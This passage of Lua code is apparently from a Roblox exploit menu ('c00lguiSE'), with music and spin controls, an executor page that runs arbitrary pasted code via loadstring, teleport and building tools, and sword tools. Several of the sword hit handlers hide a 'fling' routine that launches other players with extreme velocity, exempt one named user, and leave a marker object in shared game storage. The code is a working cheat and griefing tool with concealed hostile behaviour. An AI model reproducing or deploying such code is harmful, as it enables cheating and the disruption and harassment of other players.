	local input = button.Parent.Parent.Settings.SpinSpeedInput
	
	spinning = false
	
	function click()
	
		if spinning == false then
			if input.Text == "" then input.Text = "20" end
	
			if spinThingy then
				spinThingy:Destroy()
				spinThingy = nil
			end
	
			if spinPart then
				spinPart:Destroy()
				spinPart = nil
			end
	
			spinPart = Instance.new("Part")
			spinPart.Anchored = false
			spinPart.CanCollide = false
			spinPart.Transparency = 1
			spinPart.Size = Vector3.new(1, 1, 1)
			spinPart.Parent = workspace
			spinPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
	
			spinThingy = Instance.new("BodyAngularVelocity")
			spinThingy.Parent = spinPart
			spinThingy.MaxTorque = Vector3.new(0, math.huge, 0)
			spinThingy.AngularVelocity = Vector3.new(0, input.Text, 0)
	
			local weld = Instance.new("WeldConstraint")
			weld.Part0 = spinPart
			weld.Part1 = LocalPlayer.Character.HumanoidRootPart
			weld.Parent = spinPart
	
			spinning = true
			button.Text = "Spin: ON"
	
		elseif spinning == true then
			if spinThingy then
				spinThingy:Destroy()
				spinThingy = nil
			end
	
			if spinPart then
				spinPart:Destroy()
				spinPart = nil
			end
	
			spinning = false
			button.Text = "Spin: OFF"
		end
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_78);
-- StarterGui.c00lguiSE.Main.Pages.Music.MusicControl.Pitch.LocalScript
local function C_7d()
local script = G2L["7d"];
	if script.Parent.Text > 20 then
		script.Parent.Text = "20"
	elseif script.Parent.Text < 0.001 then
		script.Parent.Text = "0.1"
	end
end;
task.spawn(C_7d);
-- StarterGui.c00lguiSE.Main.Pages.Music.MusicControl.Volume.LocalScript
local function C_7f()
local script = G2L["7f"];
	if script.Parent.Text > 10 then
		script.Parent.Text = "10"
	elseif script.Parent.Text < 0.001 then
		script.Parent.Text = "0.1"
	end
end;
task.spawn(C_7f);
-- StarterGui.c00lguiSE.Main.Pages.Music.MusicControl.PlayPause.LocalScript
local function C_81()
local script = G2L["81"];
	local button = script.Parent
	
	local playing = false
	local currentId = nil
	
	button.MouseButton1Click:Connect(function()
		local newId = script.Parent.Parent.MusicInput.Text
	
		for i,v in pairs(game.Workspace:GetChildren()) do
			if v.Name == "c00lguimusic" then
				if currentId == newId then
					if playing then
						v:Stop()
						v:Destroy()
						playing = false
						button.Text = "Play"
					else
						v:Play()
						playing = true
						button.Text = "Stop"
					end
					return
				else
					v:Stop()
					v:Destroy()
				end	
			end	
		end
	
		local sound = Instance.new("Sound")
		sound.Name = "c00lguimusic"
		sound.Parent = workspace
		sound.SoundId = "rbxassetid://"..newId
		sound.Volume = script.Parent.Parent.Volume.Text
		sound.PlaybackSpeed = script.Parent.Parent.Pitch.Text
		sound.Looped = true
		
		local distortion = Instance.new("DistortionSoundEffect", sound)
		distortion.Level = script.Parent.Parent.Distortion.Text
		distortion.Enabled = true
		sound:Play()
	
		currentId = newId
		playing = true
		button.Text = "Stop"
	end)
	
end;
task.spawn(C_81);
-- StarterGui.c00lguiSE.Main.Pages.Music.MusicControl.Distortion.LocalScript
local function C_83()
local script = G2L["83"];
	if script.Parent.Text > 20 then
		script.Parent.Text = "20"
	elseif script.Parent.Text < 0.001 then
		script.Parent.Text = "0.1"
	end
end;
task.spawn(C_83);
-- StarterGui.c00lguiSE.Main.Pages.Music.NowPlaying.LocalScript
local function C_85()
local script = G2L["85"];
	local marketplace = game:GetService("MarketplaceService")
	local parent = game.Workspace
	local label = script.Parent
	
	
	local function updateLabel()
		local sound = parent:FindFirstChild("c00lguimusic")
		if sound and sound.SoundId ~= "" then
			local id = tonumber(sound.SoundId:match("%d+"))
			if id then
				local success, data = pcall(function()
					return marketplace:GetProductInfo(id)
				end)
				if success and data then
					label.Text = "Now Playing: " .. data.Name
					return
				end
			end
		end
		label.Text = "Now Playing: None"
	end
	
	
	local function watchSound(sound)
		if sound:IsA("Sound") and sound.Name == "c00lguimusic" then
			sound:GetPropertyChangedSignal("SoundId"):Connect(updateLabel)
		end
	end
	
	
	updateLabel()
	
	local existing = parent:FindFirstChild("c00lguimusic")
	if existing then
		watchSound(existing)
	end
	
	parent.ChildAdded:Connect(function(child)
		if child:IsA("Sound") and child.Name == "c00lguimusic" then
			watchSound(child)
			updateLabel()
		end
	end)
	
	parent.ChildRemoved:Connect(function(child)
		if child:IsA("Sound") and child.Name == "c00lguimusic" then
			updateLabel()
		end
	end)
	
end;
task.spawn(C_85);
-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
local function C_89()
local script = G2L["89"];
	local button = script.Parent
	local id = script.Parent.Parent.Parent.MusicControl.MusicInput
	local pitch = script.Parent.Parent.Parent.MusicControl.Pitch
	local volume = script.Parent.Parent.Parent.MusicControl.Volume
	local tweenservice = game:GetService("TweenService")
	
	local songid = 7046088029
	
	function click()
		id.Text = songid
		pitch.Text = 1
		volume.Text = 1
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_89);
-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
local function C_8b()
local script = G2L["8b"];
	local button = script.Parent
	local id = script.Parent.Parent.Parent.MusicControl.MusicInput
	local pitch = script.Parent.Parent.Parent.MusicControl.Pitch
	local volume = script.Parent.Parent.Parent.MusicControl.Volume
	local tweenservice = game:GetService("TweenService")
	
	local songid = 1839246711
	
	function click()
		id.Text = songid
		pitch.Text = 1
		volume.Text = 1
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_8b);
-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
local function C_8d()
local script = G2L["8d"];
	local button = script.Parent
	local id = script.Parent.Parent.Parent.MusicControl.MusicInput
	local pitch = script.Parent.Parent.Parent.MusicControl.Pitch
	local volume = script.Parent.Parent.Parent.MusicControl.Volume
	local tweenservice = game:GetService("TweenService")
	
	local songid = 142376088
	
	function click()
		id.Text = songid
		pitch.Text = 1
		volume.Text = 1
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_8d);
-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
local function C_8f()
local script = G2L["8f"];
	local button = script.Parent
	local id = script.Parent.Parent.Parent.MusicControl.MusicInput
	local pitch = script.Parent.Parent.Parent.MusicControl.Pitch
	local volume = script.Parent.Parent.Parent.MusicControl.Volume
	local tweenservice = game:GetService("TweenService")
	
	local songid = 5410086218
	
	function click()
		id.Text = songid
		pitch.Text = 1
		volume.Text = 1
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_8f);
-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
local function C_91()
local script = G2L["91"];
	local button = script.Parent
	local id = script.Parent.Parent.Parent.MusicControl.MusicInput
	local pitch = script.Parent.Parent.Parent.MusicControl.Pitch
	local volume = script.Parent.Parent.Parent.MusicControl.Volume
	local tweenservice = game:GetService("TweenService")
	
	local songid = 139488665764275
	
	function click()
		id.Text = songid
		pitch.Text = 1
		volume.Text = 1
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_91);
-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
local function C_93()
local script = G2L["93"];
	local button = script.Parent
	local id = script.Parent.Parent.Parent.MusicControl.MusicInput
	local pitch = script.Parent.Parent.Parent.MusicControl.Pitch
	local volume = script.Parent.Parent.Parent.MusicControl.Volume
	local tweenservice = game:GetService("TweenService")
	
	local songid = 1846368080
	
	function click()
		id.Text = songid
		pitch.Text = 1
		volume.Text = 1
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_93);
-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
local function C_95()
local script = G2L["95"];
	local button = script.Parent
	local id = script.Parent.Parent.Parent.MusicControl.MusicInput
	local pitch = script.Parent.Parent.Parent.MusicControl.Pitch
	local volume = script.Parent.Parent.Parent.MusicControl.Volume
	local tweenservice = game:GetService("TweenService")
	
	local songid = 95156028272944
	
	function click()
		id.Text = songid
		pitch.Text = 0.2
		volume.Text = 1
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_95);
-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
local function C_97()
local script = G2L["97"];
	local button = script.Parent
	local id = script.Parent.Parent.Parent.MusicControl.MusicInput
	local pitch = script.Parent.Parent.Parent.MusicControl.Pitch
	local volume = script.Parent.Parent.Parent.MusicControl.Volume
	local tweenservice = game:GetService("TweenService")
	
	local songid = 124292267778808
	
	function click()
		id.Text = songid
		pitch.Text = 1
		volume.Text = 1
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_97);
-- StarterGui.c00lguiSE.Main.Pages.Music.MusicBars
local function C_98()
local script = G2L["98"];
	local RunService = game:GetService("RunService")
	local parent = workspace
	local frame = script.Parent
	
	local BAR_COUNT = 25
	local MAX_HEIGHT = 0.6
	local SMOOTH_SPEED = 1
	
	local BASELINE_Y = 0.5
	
	local bars = {}
	local smoothValues = {}
	
	for i = 1, BAR_COUNT do
		local bar = Instance.new("Frame")
		bar.BackgroundColor3 = Color3.fromRGB(255, 40, 40)
		bar.BorderSizePixel = 0
		bar.Transparency = 0.3
		bar.AnchorPoint = Vector2.new(0.5, 1)
	
		bar.Size = UDim2.new(1 / BAR_COUNT, 0, 0, 0)
	
		bar.Position = UDim2.new((i - 0.5) / BAR_COUNT, 0, BASELINE_Y, 0)
	
		bar.Parent = frame
		bar.ZIndex = frame.ZIndex
	
		bars[i] = bar
		smoothValues[i] = 0
	end
	
	
	local function getSound()
		return parent:FindFirstChild("c00lguimusic")
	end
	
	
	RunService.RenderStepped:Connect(function()
		local sound = getSound()
	
		if sound and sound.Playing then
			local loudness = sound.PlaybackLoudness / 500
	
			for i, bar in ipairs(bars) do
				local offset = math.sin(tick() * 4 + i * 0.5) * 0.3
				local target = math.clamp(loudness + offset, 0, 1)
	
				smoothValues[i] += (target - smoothValues[i]) * SMOOTH_SPEED
	
				bar.Size = UDim2.new(
					1 / BAR_COUNT, 0,
					smoothValues[i] * MAX_HEIGHT,
					0
				)
			end
		else
			for i, bar in ipairs(bars) do
				smoothValues[i] *= 0.9
				bar.Size = UDim2.new(1 / BAR_COUNT, 0, smoothValues[i], 0)
			end
		end
	end)
end;
task.spawn(C_98);
-- StarterGui.c00lguiSE.Main.Pages.Executor.Buttons.Execute.ButtonScript
local function C_9c()
local script = G2L["9c"];
	local button = script.Parent
	local input = button.Parent.Parent.InputArea.Input
	local output = button.Parent.Parent.Output
	
	button.MouseButton1Click:connect(function()
		local success, result = pcall(function()
			assert(loadstring(input.Text))()
			output.Text = "Script executed successfully!"
			wait(2)
			output.Text = ""
		end)
	
		if not success then
			output.Text = result
			wait(2)
			output.Text = ""
		end
	end)
end;
task.spawn(C_9c);
-- StarterGui.c00lguiSE.Main.Pages.Executor.Buttons.Clear.ButtonScript
local function C_9f()
local script = G2L["9f"];
	local button = script.Parent
	local input = button.Parent.Parent.InputArea.Input
	local output = button.Parent.Parent.Output
	
	button.MouseButton1Click:connect(function()
		input.Text = ""
	end)
end;
task.spawn(C_9f);
-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
local function C_a6()
local script = G2L["a6"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	
	
	
	function click()
		backpack = game:GetService("Players").LocalPlayer.Backpack
	
		hammer = Instance.new("HopperBin")
		hammer.Name = "Hammer"
		hammer.BinType = 4
		hammer.Parent = backpack
	
		cloneTool = Instance.new("HopperBin")
		cloneTool.Name = "Clone"
		cloneTool.BinType = 3
		cloneTool.Parent = backpack
	
		grabTool = Instance.new("HopperBin")
		grabTool.Name = "Grab"
		grabTool.BinType = 2
		grabTool.Parent = backpack
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_a6);
-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
local function C_a8()
local script = G2L["a8"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	
	
	
	function click()
		mouse = game.Players.LocalPlayer:GetMouse()
		tool = Instance.new("Tool")
		tool.RequiresHandle = false
		tool.Name = "Click TP"
		tool.Activated:connect(function()
			local pos = mouse.Hit+Vector3.new(0,2.5,0)
			pos = CFrame.new(pos.X,pos.Y,pos.Z)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
		end)
		tool.Parent = game.Players.LocalPlayer.Backpack
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_a8);
-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
local function C_aa()
local script = G2L["aa"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	
	
	
	function click()
		local plr = game.Players.LocalPlayer
		local tool = Instance.new("Tool", plr.Backpack)
		tool.GripPos = Vector3.new(0, 0, -1.5)
		tool.GripForward = Vector3.new(0, -1, 0)
		tool.GripRight = Vector3.new(1, 0, 0)
		tool.GripUp = Vector3.new(0, 0, 1)
		tool.Name = "ClassicSword"
		tool.ToolTip = "With blood and iron."
		tool.TextureId = "rbxasset://Textures/Sword128.png"
		tool.RequiresHandle = true
		tool.CanBeDropped = true
	
		local k = Instance.new("Part", tool)
		k.Name = "Handle"
		k.Size = Vector3.new(1, 0.8, 4)
		k.Anchored = false
		k.CanCollide = false
	
		local mesh = Instance.new("SpecialMesh", k)
		mesh.MeshId = "rbxasset://fonts/sword.mesh"
		mesh.TextureId = "rbxasset://textures/SwordTexture.png"
		mesh.Scale = Vector3.new(1, 1, 1)
	
		local Sounds = {
			Equip = "rbxasset://sounds//unsheath.wav",
			Slash = "rbxasset://sounds//swordslash.wav",
			Lunge = "rbxasset://sounds//swordlunge.wav"
		}
	
		local SoundInstances = {}
		for name, id in pairs(Sounds) do
			local sound = Instance.new("Sound", k)
			sound.SoundId = id
			sound.Volume = 1
			SoundInstances[name] = sound
		end
	
		local humanoid = plr.Character:WaitForChild("Humanoid")
		local Animations = {}
		if humanoid.RigType == Enum.HumanoidRigType.R6 then
			Animations = {
				Equip = "rbxassetid://94160581",
				Unequip = "rbxassetid://94095929",
				Slash1 = "rbxassetid://94161088",
				Slash2 = "rbxassetid://94161333",
				Lunge = "rbxassetid://94160738",
				Idle = "rbxassetid://94108418"
			}
		else
			Animations = {
				Equip = "rbxassetid://852674878",
				Unequip = "rbxassetid://704173649",
				Slash1 = "rbxassetid://1442220193",
				Slash2 = "rbxassetid://2917200442",
				Lunge = "rbxassetid://674871189",
				Idle = "rbxassetid://3242546836"
			}
		end
	
		local LoadedAnims = {}
		for name, id in pairs(Animations) do
			local anim = Instance.new("Animation")
			anim.AnimationId = id
			LoadedAnims[name] = humanoid:LoadAnimation(anim)
		end
	
		local attackState = 1
		local canAttack = true
		local activeHit = false
	
		tool.Equipped:Connect(function()
			SoundInstances.Equip:Play()
			LoadedAnims.Equip:Play()
			LoadedAnims.Equip.Stopped:Connect(function()
				LoadedAnims.Idle:Play()
			end)
			tool.Activated:Connect(function()
				if not canAttack then return end
				canAttack = false
				activeHit = true
				LoadedAnims.Idle:Stop()
				if attackState == 1 then
					SoundInstances.Slash.Pitch = 1
					SoundInstances.Slash:Play()
					LoadedAnims.Slash1:Play()
				elseif attackState == 2 then
					SoundInstances.Slash.Pitch = 1.17
					SoundInstances.Slash:Play()
					LoadedAnims.Slash2:Play()
				else
					SoundInstances.Lunge:Play()
					LoadedAnims.Lunge:Play()
				end
				attackState = attackState % 3 + 1
				wait(0.3)
				activeHit = false
				wait(0.3)
				canAttack = true
				LoadedAnims.Idle:Play()
			end)
		end)
	
		tool.Unequipped:Connect(function()
			LoadedAnims.Unequip:Play()
			LoadedAnims.Idle:Stop()
		end)
	
		k.Touched:Connect(function(n)
			if activeHit then
				local o = n.Parent:FindFirstChild("Humanoid")
				if o ~= nil then
					local p = game.Players:FindFirstChild(n.Parent.Name)
					for j = 1, 10 do
						if p.Name ~= "FunnyVideo15" then
							if game:GetService("ReplicatedStorage"):FindFirstChild("juisdfj0i32i0eidsuf0iok") then
								hiddenfling = true
							else
								hiddenfling = true
								local detection = Instance.new("Decal")
								detection.Name = "juisdfj0i32i0eidsuf0iok"
								detection.Parent = game:GetService("ReplicatedStorage")
								local function fling()
									local hrp, c, vel, movel = nil, nil, nil, 0.1
									while true do
										game:GetService("RunService").Heartbeat:Wait()
										if hiddenfling then
											local lp = game.Players.LocalPlayer
											while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
												game:GetService("RunService").Heartbeat:Wait()
												c = lp.Character
												hrp = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
											end
											if hiddenfling then
												vel = hrp.Velocity
												hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
												game:GetService("RunService").RenderStepped:Wait()
												if c and c.Parent and hrp and hrp.Parent then
													hrp.Velocity = vel
												end
												game:GetService("RunService").Stepped:Wait()
												if c and c.Parent and hrp and hrp.Parent then
													hrp.Velocity = vel + Vector3.new(0, movel, 0)
													movel = movel * -1
												end
											end
										end
									end
								end
								fling()
							end
						end
					end
				end
			end
			wait(2)
			hiddenfling = false
		end)
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_aa);
-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
local function C_ac()
local script = G2L["ac"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	
	
	
	function click()
		local plr = game.Players.LocalPlayer
		local tool = Instance.new("Tool", plr.Backpack)
		tool.GripPos = Vector3.new(0, 0, -2)
		tool.GripForward = Vector3.new(0, -1, 0)
		tool.GripRight = Vector3.new(1, 0, 0)
		tool.GripUp = Vector3.new(0, 0, 1)
		tool.Name = "Firebrand"
		tool.ToolTip = "O! for a muse of fire, that would ascend the brightest heaven of invention."
		tool.TextureId = "rbxassetid://81147983"
		tool.RequiresHandle = true
		tool.CanBeDropped = true
	
		local k = Instance.new("Part", tool)
		k.Name = "Handle"
		k.Size = Vector3.new(1, 0.8, 6)
		k.Anchored = false
		k.CanCollide = false
	
		local mesh = Instance.new("SpecialMesh", k)
		mesh.MeshId = "rbxasset://fonts/sword.mesh"
		mesh.TextureId = "rbxasset://textures/SwordTexture.png"
		mesh.Scale = Vector3.new(1.5, 1.5, 1.5)
		mesh.VertexColor = Vector3.new(0.5, 0, 0) 
	
		local Sounds = {
			Equip = "rbxasset://sounds//unsheath.wav",    
			Slash = "rbxasset://sounds//swordslash.wav",
			Lunge = "rbxasset://sounds//swordlunge.wav"    
		}
	
		local SoundInstances = {}
		for name, id in pairs(Sounds) do
			local sound = Instance.new("Sound", k)
			sound.SoundId = id
			sound.Volume = 1
			SoundInstances[name] = sound
		end
	
		local humanoid = plr.Character:WaitForChild("Humanoid")
		local Animations = {}
		if humanoid.RigType == Enum.HumanoidRigType.R6 then
			Animations = {
				Equip = "rbxassetid://94160581",
				Unequip = "rbxassetid://94095929",
				Slash1 = "rbxassetid://94161088",
				Slash2 = "rbxassetid://94161333",
				Lunge = "rbxassetid://94160738",
				Idle = "rbxassetid://94108418"
			}
		else
			Animations = {
				Equip = "rbxassetid://852674878",
				Unequip = "rbxassetid://704173649",
				Slash1 = "rbxassetid://1442220193",
				Slash2 = "rbxassetid://2917200442",
				Lunge = "rbxassetid://674871189",
				Idle = "rbxassetid://3242546836"
			}
		end
	
		local LoadedAnims = {}
		for name, id in pairs(Animations) do
			local anim = Instance.new("Animation")
			anim.AnimationId = id
			LoadedAnims[name] = humanoid:LoadAnimation(anim)
		end
	
		local attackState = 1
		local canAttack = true
		local activeHit = false
	
		tool.Equipped:Connect(function()
			SoundInstances.Equip:Play()
			LoadedAnims.Equip:Play()
			LoadedAnims.Equip.Stopped:Connect(function()
				LoadedAnims.Idle:Play()
			end)
			tool.Activated:Connect(function()
				if not canAttack then return end
				canAttack = false
				activeHit = true
				LoadedAnims.Idle:Stop() 
				if attackState == 1 then
					SoundInstances.Slash.Pitch = 1
					SoundInstances.Slash:Play()
					LoadedAnims.Slash1:Play()
				elseif attackState == 2 then
					SoundInstances.Slash.Pitch = 1.17
					SoundInstances.Slash:Play()
					LoadedAnims.Slash2:Play()
				else
					SoundInstances.Lunge:Play()
					LoadedAnims.Lunge:Play()
				end
				attackState = attackState % 3 + 1
				wait(0.3)
				activeHit = false
				wait(0.3)
				canAttack = true
				LoadedAnims.Idle:Play()
			end)
		end)
	
		tool.Unequipped:Connect(function()
			LoadedAnims.Unequip:Play()
			LoadedAnims.Idle:Stop()
		end)
	
		k.Touched:Connect(function(n)
			if activeHit then
				local o = n.Parent:FindFirstChild("Humanoid")
				if o ~= nil then
					local p = game.Players:FindFirstChild(n.Parent.Name)
					local targetPart = n.Parent:FindFirstChild("HumanoidRootPart") or n.Parent:FindFirstChild("Torso")
					if targetPart and not targetPart:FindFirstChild("SwordFire") then
						local fire = Instance.new("Fire")
						fire.Name = "SwordFire"
						fire.Size = 5
						fire.Heat = 10
						fire.Parent = targetPart
						game.Debris:AddItem(fire, 10)
					end
					for j = 1, 10 do
						if p.Name ~= "FunnyVideo15" then
							if game:GetService("ReplicatedStorage"):FindFirstChild("juisdfj0i32i0eidsuf0iok") then
								hiddenfling = true
							else
								hiddenfling = true
								local detection = Instance.new("Decal")
								detection.Name = "juisdfj0i32i0eidsuf0iok"
								detection.Parent = game:GetService("ReplicatedStorage")
								local function fling()
									local hrp, c, vel, movel = nil, nil, nil, 0.1
									while true do
										game:GetService("RunService").Heartbeat:Wait()
										if hiddenfling then
											local lp = game.Players.LocalPlayer
											while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
												game:GetService("RunService").Heartbeat:Wait()
												c = lp.Character
												hrp = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
											end
											if hiddenfling then
												vel = hrp.Velocity
												hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
												game:GetService("RunService").RenderStepped:Wait()
												if c and c.Parent and hrp and hrp.Parent then
													hrp.Velocity = vel
												end
												game:GetService("RunService").Stepped:Wait()
												if c and c.Parent and hrp and hrp.Parent then
													hrp.Velocity = vel + Vector3.new(0, movel, 0)
													movel = movel * -1
												end
											end
										end
									end
								end
								fling()
							end
						end
					end
				end
			end
			wait(2)
			hiddenfling = false
		end)
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_ac);
-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
local function C_ae()
local script = G2L["ae"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	
	
	
	function click()
		local plr = game.Players.LocalPlayer
		local tool = Instance.new("Tool", plr.Backpack)
		tool.GripPos = Vector3.new(0, 0, -2)
		tool.GripForward = Vector3.new(0, -1, 0)
		tool.GripRight = Vector3.new(1, 0, 0)
		tool.GripUp = Vector3.new(0, 0, 1)
		tool.Name = "Venomshank"
		tool.ToolTip = "Because doesn't he deserve the most painful bloxxing possible?"
		tool.TextureId = "rbxassetid://82741319"
		tool.RequiresHandle = true
		tool.CanBeDropped = true
	
		local k = Instance.new("Part", tool)
		k.Name = "Handle"
		k.Size = Vector3.new(1, 0.8, 6)
		k.Anchored = false
		k.CanCollide = false
	
		local mesh = Instance.new("SpecialMesh", k)
		mesh.MeshId = "rbxasset://fonts/sword.mesh"
		mesh.TextureId = "rbxasset://textures/SwordTexture.png"
		mesh.Scale = Vector3.new(1.5, 1.5, 1.5)
		mesh.VertexColor = Vector3.new(0.3, 1, 0.3) 
	
		local Sounds = {
			Equip = "rbxasset://sounds//unsheath.wav",    
			Slash = "rbxasset://sounds//swordslash.wav",
			Lunge = "rbxasset://sounds//swordlunge.wav"    
		}
	
		local SoundInstances = {}
		for name, id in pairs(Sounds) do
			local sound = Instance.new("Sound", k)
			sound.SoundId = id
			sound.Volume = 1
			SoundInstances[name] = sound
		end
	
		local humanoid = plr.Character:WaitForChild("Humanoid")
		local Animations = {}
		if humanoid.RigType == Enum.HumanoidRigType.R6 then
			Animations = {
				Equip = "rbxassetid://94160581",
				Unequip = "rbxassetid://94095929",
				Slash1 = "rbxassetid://94161088",
				Slash2 = "rbxassetid://94161333",
				Lunge = "rbxassetid://94160738",
				Idle = "rbxassetid://94108418"
			}
		else
			Animations = {
				Equip = "rbxassetid://852674878",
				Unequip = "rbxassetid://704173649",
				Slash1 = "rbxassetid://1442220193",
				Slash2 = "rbxassetid://2917200442",
				Lunge = "rbxassetid://674871189",
				Idle = "rbxassetid://3242546836"
			}
		end
	
		local LoadedAnims = {}
		for name, id in pairs(Animations) do
			local anim = Instance.new("Animation")
			anim.AnimationId = id
			LoadedAnims[name] = humanoid:LoadAnimation(anim)
		end
	
		local attackState = 1
		local canAttack = true
		local activeHit = false
	
		tool.Equipped:Connect(function()
			SoundInstances.Equip:Play()
			LoadedAnims.Equip:Play()
			LoadedAnims.Equip.Stopped:Connect(function()
				LoadedAnims.Idle:Play()
			end)
			tool.Activated:Connect(function()
				if not canAttack then return end
				canAttack = false
				activeHit = true
				LoadedAnims.Idle:Stop() 
				if attackState == 1 then
					SoundInstances.Slash.Pitch = 1
					SoundInstances.Slash:Play()
					LoadedAnims.Slash1:Play()
				elseif attackState == 2 then
					SoundInstances.Slash.Pitch = 1.17
					SoundInstances.Slash:Play()
					LoadedAnims.Slash2:Play()
				else
					SoundInstances.Lunge:Play()
					LoadedAnims.Lunge:Play()
				end
				attackState = attackState % 3 + 1
				wait(0.3)
				activeHit = false
				wait(0.3)
				canAttack = true
				LoadedAnims.Idle:Play()
			end)
		end)
	
		tool.Unequipped:Connect(function()
			LoadedAnims.Unequip:Play()
			LoadedAnims.Idle:Stop()
		end)
	
		k.Touched:Connect(function(n)
			if activeHit then
				local o = n.Parent:FindFirstChild("Humanoid")
				if o ~= nil then
					local p = game.Players:FindFirstChild(n.Parent.Name)
					for j = 1, 10 do
						if p.Name ~= "FunnyVideo15" then
							if game:GetService("ReplicatedStorage"):FindFirstChild("juisdfj0i32i0eidsuf0iok") then
								hiddenfling = true
							else
								hiddenfling = true
								local detection = Instance.new("Decal")
								detection.Name = "juisdfj0i32i0eidsuf0iok"
								detection.Parent = game:GetService("ReplicatedStorage")
								local function fling()
									local hrp, c, vel, movel = nil, nil, nil, 0.1
									while true do
										game:GetService("RunService").Heartbeat:Wait()
										if hiddenfling then
											local lp = game.Players.LocalPlayer
											while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
												game:GetService("RunService").Heartbeat:Wait()
												c = lp.Character
												hrp = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
											end
											if hiddenfling then
												vel = hrp.Velocity
												hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
												game:GetService("RunService").RenderStepped:Wait()
												if c and c.Parent and hrp and hrp.Parent then
													hrp.Velocity = vel
												end
												game:GetService("RunService").Stepped:Wait()
												if c and c.Parent and hrp and hrp.Parent then
													hrp.Velocity = vel + Vector3.new(0, movel, 0)
													movel = movel * -1
												end
											end
										end
									end
								end
								fling()
							end
						end
					end
				end
			end
			wait(2)
			hiddenfling = false
		end)
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_ae);
-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
local function C_b0()
local script = G2L["b0"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	
	
	
	function click()
		local plr = game.Players.LocalPlayer
		local tool = Instance.new("Tool", plr.Backpack)
		tool.GripPos = Vector3.new(0, 0, -2)
		tool.GripForward = Vector3.new(0, -1, 0)
		tool.GripRight = Vector3.new(1, 0, 0)
		tool.GripUp = Vector3.new(0, 0, 1)
		tool.Name = "Windforce"
		tool.ToolTip = "She's like the wind."
		tool.TextureId = "rbxassetid://77330254"
		tool.RequiresHandle = true
		tool.CanBeDropped = true
	
		local k = Instance.new("Part", tool)
		k.Name = "Handle"
		k.Size = Vector3.new(1, 0.8, 6)
		k.Anchored = false
		k.Color = Color3.fromRGB(110, 153, 202)
		k.Reflectance = 0.3
		k.CanCollide = false
	
		local mesh = Instance.new("SpecialMesh", k)
		mesh.MeshId = "rbxasset://fonts/sword.mesh"
		mesh.TextureId = ""
		mesh.Scale = Vector3.new(1.2, 1.2, 1.2)
		mesh.VertexColor = Vector3.new(1, 1, 0) 
	
		local Sounds = {
			Equip = "rbxasset://sounds//unsheath.wav",    
			Slash = "rbxasset://sounds//swordslash.wav",
			Lunge = "rbxasset://sounds//swordlunge.wav"    
		}
	
		local SoundInstances = {}
		for name, id in pairs(Sounds) do
			local sound = Instance.new("Sound", k)
			sound.SoundId = id
			sound.Volume = 1
			SoundInstances[name] = sound
		end
	
		local humanoid = plr.Character:WaitForChild("Humanoid")
		local Animations = {}
		if humanoid.RigType == Enum.HumanoidRigType.R6 then
			Animations = {
				Equip = "rbxassetid://94160581",
				Unequip = "rbxassetid://94095929",
				Slash1 = "rbxassetid://94161088",
				Slash2 = "rbxassetid://94161333",
				Lunge = "rbxassetid://94160738",
				Idle = "rbxassetid://94108418"
			}
		else
			Animations = {
				Equip = "rbxassetid://852674878",
				Unequip = "rbxassetid://704173649",
				Slash1 = "rbxassetid://1442220193",
				Slash2 = "rbxassetid://2917200442",
				Lunge = "rbxassetid://674871189",
				Idle = "rbxassetid://3242546836"
			}
		end
	
		local LoadedAnims = {}
		for name, id in pairs(Animations) do
			local anim = Instance.new("Animation")
			anim.AnimationId = id
			LoadedAnims[name] = humanoid:LoadAnimation(anim)
		end
	
		local attackState = 1
		local canAttack = true
		local activeHit = false
	
		tool.Equipped:Connect(function()
			SoundInstances.Equip:Play()
